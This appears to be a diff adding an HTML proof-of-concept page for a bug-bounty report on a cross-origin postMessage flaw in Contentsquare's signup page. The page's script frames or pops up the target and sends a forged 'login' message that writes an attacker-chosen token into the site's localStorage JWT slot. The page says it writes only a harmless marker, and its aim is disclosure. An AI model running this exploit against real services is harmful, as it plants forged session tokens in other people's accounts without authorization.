@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Contentsquare postMessage PoC</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f6f7f9;
+        --panel: #ffffff;
+        --ink: #17202a;
+        --muted: #64748b;
+        --line: #d8dee8;
+        --accent: #0f766e;
+        --accent-strong: #115e59;
+        --warn: #9a3412;
+        --code: #111827;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--ink);
+        font: 15px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+
+      main {
+        width: min(1120px, calc(100vw - 32px));
+        margin: 32px auto;
+      }
+
+      h1,
+      h2 {
+        margin: 0;
+        line-height: 1.2;
+        letter-spacing: 0;
+      }
+
+      h1 {
+        font-size: 28px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+
+      p {
+        margin: 10px 0 0;
+        color: var(--muted);
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: minmax(0, 1.05fr) minmax(320px, 0.95fr);
+        gap: 16px;
+        margin-top: 18px;
+      }
+
+      .panel {
+        background: var(--panel);
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 18px;
+      }
+
+      .stack {
+        display: grid;
+        gap: 14px;
+      }
+
+      .row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 6px;
+        font-size: 13px;
+        font-weight: 650;
+      }
+
+      input,
+      textarea {
+        width: 100%;
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        padding: 10px 11px;
+        color: var(--ink);
+        background: #fff;
+        font: 13px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      }
+
+      textarea {
+        min-height: 98px;
+        resize: vertical;
+      }
+
+      button {
+        appearance: none;
+        border: 1px solid var(--accent);
+        border-radius: 6px;
+        background: var(--accent);
+        color: #fff;
+        padding: 9px 12px;
+        font: 650 14px/1 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        cursor: pointer;
+      }
+
+      button.secondary {
+        background: #fff;
+        color: var(--accent-strong);
+      }
+
+      button:disabled {
+        opacity: 0.55;
+        cursor: wait;
+      }
+
+      code,
+      pre {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      }
+
+      pre {
+        margin: 0;
+        overflow: auto;
+        border-radius: 6px;
+        background: var(--code);
+        color: #e5e7eb;
+        padding: 12px;
+        min-height: 220px;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+
+      .note {
+        border-left: 4px solid var(--warn);
+        padding: 10px 12px;
+        background: #fff7ed;
+        color: #7c2d12;
+        border-radius: 6px;
+      }
+
+      .note p {
+        margin: 0;
+        color: inherit;
+      }
+
+      .frame-wrap {
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        overflow: hidden;
+        background: #f8fafc;
+        min-height: 240px;
+      }
+
+      iframe {
+        display: block;
+        width: 100%;
+        height: 240px;
+        border: 0;
+        background: #fff;
+      }
+
+      .kv {
+        display: grid;
+        grid-template-columns: 150px minmax(0, 1fr);
+        gap: 8px 12px;
+        font-size: 13px;
+      }
+
+      .kv div:nth-child(odd) {
+        color: var(--muted);
+      }
+
+      .mono {
+        overflow-wrap: anywhere;
+        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      }
+
+      @media (max-width: 860px) {
+        .grid {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <header>
+        <h1>Contentsquare Signup postMessage PoC</h1>
+        <p>
+          Safe YesWeHack evidence page for the cross-origin message handler issue on
+          <code>https://app.contentsquare.com/signup</code>.
+        </p>
+      </header>
+
+      <section class="grid">
+        <div class="stack">
+          <div class="panel stack">
+            <h2>Run Proof</h2>
+            <div>
+              <label for="marker">Marker token written to Contentsquare localStorage</label>
+              <input id="marker" spellcheck="false">
+            </div>
+
+            <div class="row">
+              <button id="runFrame">Run iframe PoC</button>
+              <button id="runPopup" class="secondary">Run popup PoC</button>
+              <button id="openVerify" class="secondary">Open verification tab</button>
+            </div>
+
+            <div class="note">
+              <p>
+                This page does not read or exfiltrate Contentsquare storage. It writes a visible marker
+                value only, so evidence can be captured in DevTools or screen recording.
+              </p>
+            </div>
+
+            <div>
+              <label for="check">Verification command for a tab on app.contentsquare.com</label>
+              <textarea id="check" readonly></textarea>
+            </div>
+          </div>
+
+          <div class="panel stack">
+            <h2>Evidence Log</h2>
+            <pre id="log"></pre>
+          </div>
+        </div>
+
+        <aside class="stack">
+          <div class="panel stack">
+            <h2>Current Parameters</h2>
+            <div class="kv">
+              <div>Target iframe</div>
+              <div class="mono">https://app.contentsquare.com/signup</div>
+              <div>Target origin</div>
+              <div class="mono">https://app.contentsquare.com</div>
+              <div>Message action</div>
+              <div class="mono">login</div>
+              <div>Target system</div>
+              <div class="mono">contentsquare</div>
+            </div>
+          </div>
+
+          <div class="panel stack">
+            <h2>Live Frame</h2>
+            <div class="frame-wrap" id="frameWrap">
+              <iframe id="victimFrame" title="Contentsquare signup frame"></iframe>
+            </div>
+            <p>
+              The frame may become blank after the message because the main app has stricter
+              frame-ancestor policy. The token write occurs before that navigation.
+            </p>
+          </div>
+        </aside>
+      </section>
+    </main>
+
+    <script>
+      const TARGET_URL = "https://app.contentsquare.com/signup";
+      const TARGET_ORIGIN = "https://app.contentsquare.com";
+      const WAIT_MS = 7000;
+
+      const marker = document.getElementById("marker");
+      const check = document.getElementById("check");
+      const logEl = document.getElementById("log");
+      const frame = document.getElementById("victimFrame");
+      const runFrame = document.getElementById("runFrame");
+      const runPopup = document.getElementById("runPopup");
+      const openVerify = document.getElementById("openVerify");
+
+      function randomMarker() {
+        const bytes = new Uint8Array(8);
+        crypto.getRandomValues(bytes);
+        const suffix = [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
+        return `YWH_CONTENTSQUARE_POC_${Date.now()}_${suffix}`;
+      }
+
+      function updateCheck() {
+        check.value =
+          "localStorage.getItem('uxa:jwt') === " + JSON.stringify(marker.value) +
+          "\\nlocalStorage.getItem('uxa:jwt')";
+      }
+
+      function log(message) {
+        const stamp = new Date().toISOString();
+        logEl.textContent += `[${stamp}] ${message}\n`;
+        logEl.scrollTop = logEl.scrollHeight;
+      }
+
+      function buildMessage() {
+        return {
+          action: "login",
+          ssoData: {
+            targetSystem: "contentsquare",
+            accessToken: marker.value
+          }
+        };
+      }
+
+      function setBusy(state) {
+        runFrame.disabled = state;
+        runPopup.disabled = state;
+      }
+
+      async function wait(ms) {
+        await new Promise((resolve) => setTimeout(resolve, ms));
+      }
+
+      async function runIframePoc() {
+        setBusy(true);
+        log("Loading cross-origin iframe: " + TARGET_URL);
+        frame.removeAttribute("src");
+        await wait(100);
+        frame.src = TARGET_URL;
+
+        log("Waiting " + WAIT_MS + "ms for the signup bundle to attach the message handler");
+        await wait(WAIT_MS);
+
+        log("Sending forged login postMessage from origin: " + location.origin);
+        frame.contentWindow.postMessage(buildMessage(), TARGET_ORIGIN);
+        log("Message sent. Expected result: marker is stored as app.contentsquare.com localStorage['uxa:jwt']");
+        setBusy(false);
+      }
+
+      async function runPopupPoc() {
+        setBusy(true);
+        log("Opening signup popup: " + TARGET_URL);
+        const popup = window.open(TARGET_URL, "contentsquare_signup_poc", "width=980,height=760");
+        if (!popup) {
+          log("Popup blocked by browser");
+          setBusy(false);
+          return;
+        }
+
+        log("Waiting " + WAIT_MS + "ms for the signup bundle to attach the message handler");
+        await wait(WAIT_MS);
+
+        log("Sending forged login postMessage to popup from origin: " + location.origin);
+        popup.postMessage(buildMessage(), TARGET_ORIGIN);
+        log("Message sent. The popup should navigate to https://app.contentsquare.com/");
+        setBusy(false);
+      }
+
+      function openVerificationTab() {
+        log("Opening first-party verification tab");
+        window.open("https://app.contentsquare.com/signup", "_blank", "noopener");
+      }
+
+      marker.value = randomMarker();
+      updateCheck();
+      marker.addEventListener("input", updateCheck);
+      runFrame.addEventListener("click", runIframePoc);
+      runPopup.addEventListener("click", runPopupPoc);
+      openVerify.addEventListener("click", openVerificationTab);
+
+      frame.addEventListener("load", () => {
+        log("Frame load event fired");
+      });
+
+      log("Ready. Marker token: " + marker.value);
+      log("Use iframe mode for a hidden-page attack path, or popup mode for easier screen capture.");
+    </script>
+  </body>
+</html>
